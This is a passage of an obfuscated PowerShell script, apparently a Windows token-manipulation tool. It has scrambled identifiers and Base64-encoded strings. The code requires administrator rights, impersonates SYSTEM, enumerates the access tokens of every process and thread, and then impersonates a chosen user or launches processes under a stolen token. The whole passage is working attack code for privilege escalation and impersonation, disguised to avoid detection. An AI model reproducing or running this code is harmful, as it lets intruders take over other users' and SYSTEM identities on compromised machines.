                            ${_/\_/==\/===\__/\} = ""
                            ${_/\/=\/=\__/=\/\_} = $false
                            if (${/=\___/\/\/===\/=}.Attributes -eq 0)
                            {
                                ${_/\/=\/=\__/=\/\_} = $false
                            }
                            if ((${/=\___/\/\/===\/=}.Attributes -band ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED_BY_DEFAULT) 
                            {
                                ${_/\/=\/=\__/=\/\_} = $true
                            }
                            if ((${/=\___/\/\/===\/=}.Attributes -band ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED) -eq ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_ENABLED) 
                            {
                                ${_/\/=\/=\__/=\/\_} = $true
                            }
                            if ((${/=\___/\/\/===\/=}.Attributes -band ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_REMOVED) -eq ${__/==\/==\/\_/=\_}.SE_PRIVILEGE_REMOVED) 
                            {
                                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGUAeABwAGUAYwB0AGUAZAAgAGIAZQBoAGEAdgBpAG8AcgA6ACAARgBvAHUAbgBkACAAYQAgAHQAbwBrAGUAbgAgAHcAaQB0AGgAIABTAEUAXwBQAFIASQBWAEkATABFAEcARQBfAFIARQBNAE8AVgBFAEQALgAgAFAAbABlAGEAcwBlACAAcgBlAHAAbwByAHQAIAB0AGgAaQBzACAAYQBzACAAYQAgAGIAdQBnAC4AIAA=')))
                            }
                            if (${_/\/=\/=\__/=\/\_})
                            {
                                ${_/\_______/======}.PrivilegesEnabled += ,${/=\/\_____/\/\__/}
                            }
                            else
                            {
                                ${_/\_______/======}.PrivilegesAvailable += ,${/=\/\_____/\/\__/}
                            }
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\___/==\_/\____})
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_____/\/\/\/=====})
                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $(${/=\_/\_/=\__/\/=\}.UserName.Length)"
                }
                ${/=\_/===\_/=\/\__} = ${___/\_/=\__/=\/=\}.Invoke(${/==\_/\/==\/\/\__})
                ${/==\_/\/==\/\/\__} = [IntPtr]::Zero
                if (${/=\_/===\_/=\/\__} -ne 0)
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEwAcwBhAEYAcgBlAGUAUgBlAHQAdQByAG4AQgB1AGYAZgBlAHIAIABmAGEAaQBsAGUAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8APQBcAF8ALwA9AD0APQBcAF8ALwA9AFwALwBcAF8AXwB9AA==')))
                }
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/\/\/=\_/\/=\/})
            ${/=\/\/\/=\_/\/=\/} = [IntPtr]::Zero
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/=\/\__/=\_/\_/==})
        ${/=\/\__/=\_/\_/==} = [IntPtr]::Zero
        return ${_/\_______/======}
    }
    function __/\_/\___/=\/=\_/
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            ${___/===\_/==\___/=}
        )
        ${___/==\_/==\/\/==} = @{}
        ${_/\____/=\/=\/=\_} = @{}
        ${/=\_/\/==\__/\/\_} = @{}
        foreach (${______/=\_/\__/\/} in ${___/===\_/==\___/=})
        {
            ${_/\___/\/=\/====\} = ${______/=\_/\__/\/}.Domain + "\" + ${______/=\_/\__/\/}.Username
            if (-not ${___/==\_/==\/\/==}.ContainsKey(${_/\___/\/=\/====\}))
            {
                if (${______/=\_/\__/\/}.LogonType -ne 3 -and
                    ${______/=\_/\__/\/}.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBEAFcATQAtAFwAZAArACQA'))) -and
                    ${______/=\_/\__/\/}.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAE8AQwBBAEwAXABzAFMARQBSAFYASQBDAEUAJAA='))))
                {
                    ${___/==\_/==\/\/==}.Add(${_/\___/\/=\/====\}, ${______/=\_/\__/\/})
                }
            }
            else
            {
                if(${______/=\_/\__/\/}.IsElevated -eq ${___/==\_/==\/\/==}[${_/\___/\/=\/====\}].IsElevated)
                {
                    if ((${______/=\_/\__/\/}.PrivilegesEnabled.Count + ${______/=\_/\__/\/}.PrivilegesAvailable.Count) -gt (${___/==\_/==\/\/==}[${_/\___/\/=\/====\}].PrivilegesEnabled.Count + ${___/==\_/==\/\/==}[${_/\___/\/=\/====\}].PrivilegesAvailable.Count))
                    {
                        ${___/==\_/==\/\/==}[${_/\___/\/=\/====\}] = ${______/=\_/\__/\/}
                    }
                }
                elseif ((${______/=\_/\__/\/}.IsElevated -eq $true) -and (${___/==\_/==\/\/==}[${_/\___/\/=\/====\}].IsElevated -eq $false))
                {
                    ${___/==\_/==\/\/==}[${_/\___/\/=\/====\}] = ${______/=\_/\__/\/}
                }
            }
        }
        foreach (${______/=\_/\__/\/} in ${___/===\_/==\___/=})
        {
            ${/==\__/\/\_/=\/\_} = "$(${______/=\_/\__/\/}.Domain)\$(${______/=\_/\__/\/}.Username)"
            foreach (${____/\_/\___/==\_/} in ${______/=\_/\__/\/}.PrivilegesEnabled)
            {
                if (${_/\____/=\/=\/=\_}.ContainsKey(${____/\_/\___/==\_/}))
                {
                    if(${_/\____/=\/=\/=\_}[${____/\_/\___/==\_/}] -notcontains ${/==\__/\/\_/=\/\_})
                    {
                        ${_/\____/=\/=\/=\_}[${____/\_/\___/==\_/}] += ,${/==\__/\/\_/=\/\_}
                    }
                }
                else
                {
                    ${_/\____/=\/=\/=\_}.Add(${____/\_/\___/==\_/}, @(${/==\__/\/\_/=\/\_}))
                }
            }
            foreach (${____/\_/\___/==\_/} in ${______/=\_/\__/\/}.PrivilegesAvailable)
            {
                if (${/=\_/\/==\__/\/\_}.ContainsKey(${____/\_/\___/==\_/}))
                {
                    if(${/=\_/\/==\__/\/\_}[${____/\_/\___/==\_/}] -notcontains ${/==\__/\/\_/=\/\_})
                    {
                        ${/=\_/\/==\__/\/\_}[${____/\_/\___/==\_/}] += ,${/==\__/\/\_/=\/\_}
                    }
                }
                else
                {
                    ${/=\_/\/==\__/\/\_}.Add(${____/\_/\___/==\_/}, @(${/==\__/\/\_/=\/\_}))
                }
            }
        }
        ${__/==\_/===\/\_/\} = @{
            TokenByUser = ${___/==\_/==\/\/==}
            TokenByEnabledPriv = ${_/\____/=\/=\/=\_}
            TokenByAvailablePriv = ${/=\_/\/==\__/\/\_}
        }
        return (New-Object PSObject -Property ${__/==\_/===\/\_/\})
    }
    function _/=\/===\/=\/===\_
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${__/===\/\_________}
        )
        [IntPtr]${/==\___/\___/\/\/} = [IntPtr]::Zero
        ${/==\____/====\_/\} = ${__/=\/\/\/\/\/\/=}.Invoke(${__/===\/\_________}, ${__/==\/==\/\_/=\_}.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]${/==\___/\___/\/\/}) 
        if (-not ${/==\____/====\_/\})
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEUAeAAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7AC8AXABfAF8AXwBfAC8AXABfAF8AXwBfAF8ALwA9AFwAXwB9AA==')))
        }
        else
        {
            ${/==\____/====\_/\} = ${__/\__/=\___/\_/\}.Invoke(${/==\___/\___/\/\/})
            if (-not ${/==\____/====\_/\})
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAZwBlAGQATwBuAFUAcwBlAHIALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
            }
        }
        ${/==\____/====\_/\} = ${/==\_/\/==\/==\__}.Invoke(${/==\___/\___/\/\/})
        ${/==\___/\___/\/\/} = [IntPtr]::Zero
        if (-not ${/==\____/====\_/\})
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAEgAYQBuAGQAbABlACAAZgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABOAGUAdwBIAFQAbwBrAGUAbgAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
        }
        return ${/==\____/====\_/\}
    }
    function _/=\__/\_/==\_/\/=
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${__/===\/\_________},
            [Parameter(Position=1, Mandatory=$true)]
            [String]
            ${_/===\/====\__/\/\},
            [Parameter(Position=2)]
            [String]
            $ProcessArgs,
            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAGkAbgBnACAAQwByAGUAYQB0AGUALQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAA==')))
        [IntPtr]${/==\___/\___/\/\/} = [IntPtr]::Zero
        ${/==\____/====\_/\} = ${__/=\/\/\/\/\/\/=}.Invoke(${__/===\/\_________}, ${__/==\/==\/\_/=\_}.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]${/==\___/\___/\/\/})
        if (-not ${/==\____/====\_/\})
        {
            ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAEUAeAAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7AC8AXABfAF8AXwBfAC8AXABfAF8AXwBfAF8ALwA9AFwAXwB9AA==')))
        }
        else
        {
            ${/=\/==\/\_/=\__/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${__/\/=\/=\__/\/\_})
            [IntPtr]${/===\/\/\__/=\/=\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/==\/\_/=\__/=})
            ${__/=======\/=\/==}.Invoke(${/===\/\/\__/=\/=\}, 0, ${/=\/==\/\_/=\__/=}) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32(${/===\/\/\__/=\/=\}, ${/=\/==\/\_/=\__/=}) 
            ${_/\_/=\/===\____/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${/===\/\_______/==})
            [IntPtr]${/\____/=\/\_/=\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\_/=\/===\____/})
            ${_/=\____/===\_/=\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQBcAC8APQA9AD0APQBcAF8AXwAvAFwALwBcAH0A'))))
            ${_/==\_/==\__/\/==} = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                ${_/==\_/==\__/\/==} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAkAHsAXwAvAD0APQA9AFwALwA9AD0APQA9AFwAXwBfAC8AXAAvAFwAfQAiACAAJABQAHIAbwBjAGUAcwBzAEEAcgBnAHMA'))))
            }
            ${/=\__/==\/\/\/\/\} = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwAC4AIABFAG4AYQBiAGwAaQBuAGcAIABTAGUAQQBzAHMAaQBnAG4AUAByAGkAbQBhAHIAeQBUAG8AawBlAG4AUAByAGkAdgBpAGwAZQBnAGUAIABhAG4AZAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAEEAcwBVAHMAZQByAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                _/=\_/\/=\/\/===== -____/\_/\___/==\_/ SeAssignPrimaryTokenPrivilege
                ${/==\____/====\_/\} = ${_/=\_/\/=\/\_/\__}.Invoke(${/==\___/\___/\/\/}, ${_/=\____/===\_/=\}, ${_/==\_/==\__/\/==}, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, ${/===\/\/\__/=\/=\}, ${/\____/=\/\_/=\__})
                ${/=\__/==\/\/\/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBBAHMAVQBzAGUAcgBXAA==')))
            }
            else
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIAByAHUAbgBuAGkAbgBnACAAaQBuACAAUwBlAHMAcwBpAG8AbgAgADAALAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                ${/==\____/====\_/\} = ${/=\/\/\/=\/\/=\/=}.Invoke(${/==\___/\___/\/\/}, 0x0, ${_/=\____/===\_/=\}, ${_/==\_/==\__/\/==}, 0, [IntPtr]::Zero, [IntPtr]::Zero, ${/===\/\/\__/=\/=\}, ${/\____/=\/\_/=\__})
                ${/=\__/==\/\/\/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAFQAbwBrAGUAbgBXAA==')))
            }
            if (${/==\____/====\_/\})
            {
                ${______/==\_/==\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/\____/=\/\_/=\__}, [Type]${/===\/\_______/==})
                ${/==\_/\/==\/==\__}.Invoke(${______/==\_/==\_/}.hProcess) | Out-Null
                ${/==\_/\/==\/==\__}.Invoke(${______/==\_/==\_/}.hThread) | Out-Null
		if ($PassThru) {
			${/=\/\/\_/\/\/\/\_} = ps -Id ${______/==\_/==\_/}.dwProcessId
			$null = ${/=\/\/\_/\/\/\/\_}.Handle
			${/=\/\/\_/\/\/\/\_}
		}
            }
            else
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8AXwAvAD0APQBcAC8AXAAvAFwALwBcAC8AXAB9ACAAZgBhAGkAbABlAGQALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/===\/\/\__/=\/=\})
            ${/===\/\/\__/=\/=\} = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/\____/=\/\_/=\__})
            ${/\____/=\/\_/=\__} = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode(${_/=\____/===\_/=\})
            ${_/=\____/===\_/=\} = [IntPtr]::Zero
            ${/==\____/====\_/\} = ${/==\_/\/==\/==\__}.Invoke(${/==\___/\___/\/\/})
            ${/==\___/\___/\/\/} = [IntPtr]::Zero
            if (-not ${/==\____/====\_/\})
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAEgAYQBuAGQAbABlACAAZgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABOAGUAdwBIAFQAbwBrAGUAbgAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
            }
        }
    }
    function _/=\/=\_/\_/=\___/
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            ${___/=\/====\__/\_/}
        )
        foreach (${/\____/==\/===\/\} in ${___/=\/====\__/\_/})
        {
            ${/==\____/====\_/\} = ${/==\_/\/==\/==\__}.Invoke(${/\____/==\/===\/\}.hToken)
            if (-not ${/==\____/====\_/\})
            {
                ${/\____/\_____/=\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQAgAGkAbgAgAEYAcgBlAGUALQBBAGwAbABUAG8AawBlAG4AcwAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAF8AXwBfAC8APQBcAF8AfQA=')))
            }
            ${/\____/==\/===\/\}.hToken = [IntPtr]::Zero
        }
    }
    function _/=\/====\/=\/==\/
    {
        ${___/===\_/==\___/=} = @()
        [string]${_/==\_/=\/==\_/=\} = (New-Object -TypeName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFMAZQBjAHUAcgBpAHQAeQBJAGQAZQBuAHQAaQBmAGkAZQByAA=='))) -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
        ${/==\_/\___/\/\/==} = gwmi -Class Win32_Process | % {
            ${/=\/===\_/\__/=\/} = $_.GetOwner()
            if (${/=\/===\_/\__/=\/}.Domain -and ${/=\/===\_/\__/=\/}.User) {
                ${_/=\/===\___/==\_} = "$(${/=\/===\_/\__/=\/}.Domain)\$(${/=\/===\_/\__/=\/}.User)".ToUpper()
                if (${_/=\/===\___/==\_} -eq ${_/==\_/=\/==\_/=\}.ToUpper()) {
                    $_
                }
            }
        }
        ForEach (${/=\/\_/\_/\/=\___} in ${/==\_/\___/\/\/==})
        {
            ${_/\_/\_/\/\/\/=\_} = ___/\_/\__/==\____ -ProcessId ${/=\/\_/\_/\/=\___}.ProcessId -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
            if (${_/\_/\_/\/\/\/=\_}) { break }
        }
        if (${_/\_/\_/\/\/\/=\_} -eq $null -or (-not (_/=\/===\/=\/===\_ -__/===\/\_________ ${_/\_/\_/\/\/\/=\_}.hProcToken)))
        {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABTAFkAUwBUAEUATQAsACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAHcAaQBsAGwAIABuAG8AdAAgAGIAZQAgAGEAYgBsAGUAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQAgAGEAbABsACAAdABvAGsAZQBuAHMA')))
        }
        if (${_/\_/\_/\/\/\/=\_} -ne $null -and ${_/\_/\_/\/\/\/=\_}.hProcToken -ne [IntPtr]::Zero)
        {
            ${/==\_/\/==\/==\__}.Invoke(${_/\_/\_/\/\/\/=\_}.hProcToken) | Out-Null
            ${_/\_/\_/\/\/\/=\_} = $null
        }
        ${__/\/\_/====\/\_/} = get-process | where {$_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBjAHMAcgBzAHMAJAA='))) -and $_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBzAHkAcwB0AGUAbQAkAA=='))) -and $_.id -ne 0}
        foreach ($Process in ${__/\/\_/====\/\_/})
        {
            ${___/===\/\/\/\__/} = (___/\_/\__/==\____ -ProcessId $Process.Id -__/\/==\___/=\_/==)
            if (${___/===\/\/\/\__/} -ne $null)
            {
                [IntPtr]${__/===\/\_________} = [IntPtr]${___/===\/\/\/\__/}.hProcToken
                if (${__/===\/\_________} -ne [IntPtr]::Zero)
                {
                    ${_/\_______/======} = __/===\/\/=\/\/=== -__/===\/\_________ ${__/===\/\_________}
                    if (${_/\_______/======} -ne $null)
                    {
                        ${_/\_______/======} | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id
                        ${___/===\_/==\___/=} += ${_/\_______/======}
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }
                foreach (${_/\_/\/\/=\__/\/\} in $Process.Threads)
                {
                    ${____/\_/\/=\/====} = __/\/==\/====\____ -ThreadId ${_/\_/\/\/=\__/\/\}.Id
                    [IntPtr]${__/===\/\_________} = (${____/\_/\/=\/====}.hThreadToken)
                    if (${__/===\/\_________} -ne [IntPtr]::Zero)
                    {
                        ${_/\_______/======} = __/===\/\/=\/\/=== -__/===\/\_________ ${__/===\/\_________}
                        if (${_/\_______/======} -ne $null)
                        {
                            ${_/\_______/======} | Add-Member -MemberType NoteProperty -Name ThreadId -Value ${_/\_/\/\/=\__/\/\}.Id
                            ${___/===\_/==\___/=} += ${_/\_______/======}
                        }
                    }
                }
            }
        }
        return ${___/===\_/==\___/=}
    }
    function __/====\_/===\/\/=
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            ${__/\______/\/\/==\}
        )
        ${/==\____/====\_/\} = ${____/\/=\______/\}.Invoke()
        if (${__/\______/\/\/==\})
        {
            if (${/==\____/====\_/\})
            {
                echo "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                echo "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }
    function __/\/\/=\/==\/\/\/
    {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA=')))))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQAIABtAHUAcwB0ACAAYgBlACAAcgB1AG4AIABhAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA=='))) -ErrorAction Stop
        }
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwACwAIABmAG8AcgBjAGkAbgBnACAATgBvAFUASQAgACgAcAByAG8AYwBlAHMAcwBlAHMAIABpAG4AIABTAGUAcwBzAGkAbwBuACAAMAAgAGMAYQBuAG4AbwB0ACAAaABhAHYAZQAgAGEAIABVAEkAKQA=')))
            $NoUI = $true
        }
        if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHYAVABvAFMAZQBsAGYA'))))
        {
            __/====\_/===\/\/= -__/\______/\/\/==\
        }
        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))) -or $PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABlAFUAcwBlAHIA'))))
        {
            ${___/===\_/==\___/=} = _/=\/====\/=\/==\/
            [IntPtr]${__/===\/\_________} = [IntPtr]::Zero
            ${__/\___/==\_/\__/} = (__/\_/\___/=\/=\_/ -___/===\_/==\___/= ${___/===\_/==\___/=}).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if (${__/\___/==\_/\__/}.ContainsKey($Username))
                {
                    ${__/===\/\_________} = ${__/\___/==\_/\__/}[$Username].hToken
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIAB1AHMAZQByAG4AYQBtAGUA')))
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach (${______/=\_/\__/\/} in ${___/===\_/==\___/=})
                {
                    if ((${______/=\_/\__/\/} | gm ProcessId) -and ${______/=\_/\__/\/}.ProcessId -eq $ProcessId)
                    {
                        ${__/===\/\_________} = ${______/=\_/\__/\/}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzAEkARAA=')))
                    }
                }
                if (${__/===\/\_________} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach (${______/=\_/\__/\/} in ${___/===\_/==\___/=})
                {
                    if ((${______/=\_/\__/\/} | gm ThreadId) -and ${______/=\_/\__/\/}.ThreadId -eq $ThreadId)
                    {
                        ${__/===\/\_________} = ${______/=\_/\__/\/}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABUAGgAcgBlAGEAZABJAGQA')))
                    }
                }
                if (${__/===\/\_________} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach (${______/=\_/\__/\/} in ${___/===\_/==\___/=})
                {
                    if ((${______/=\_/\__/\/} | gm ProcessId) -and ${______/=\_/\__/\/}.ProcessId -eq $Process.Id)
                    {
                        ${__/===\/\_________} = ${______/=\_/\__/\/}.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzACAAbwBiAGoAZQBjAHQA')))
                    }
                }
                if (${__/===\/\_________} -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHMAdQBwAHAAbAB5ACAAYQAgAFUAcwBlAHIAbgBhAG0AZQAsACAAUAByAG8AYwBlAHMAcwBJAGQALAAgAFQAaAByAGUAYQBkAEkAZAAsACAAbwByACAAUAByAG8AYwBlAHMAcwAgAG8AYgBqAGUAYwB0AA==')))  -ErrorAction Stop
            }
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))))
            {
                if (-not $NoUI)
                {
                    _/==\_/=====\/\_/\
                }
                _/=\__/\_/==\_/\/= -__/===\/\_________ ${__/===\/\_________} -_/===\/====\__/\/\ $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru
                __/====\_/===\/\/=
            }
            elseif ($ImpersonateUser)
            {
                _/=\/===\/=\/===\_ -__/===\/\_________ ${__/===\/\_________} | Out-Null
                echo "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            _/=\/=\_/\_/=\___/ -___/=\/====\__/\_/ ${___/===\_/==\___/=}
        }
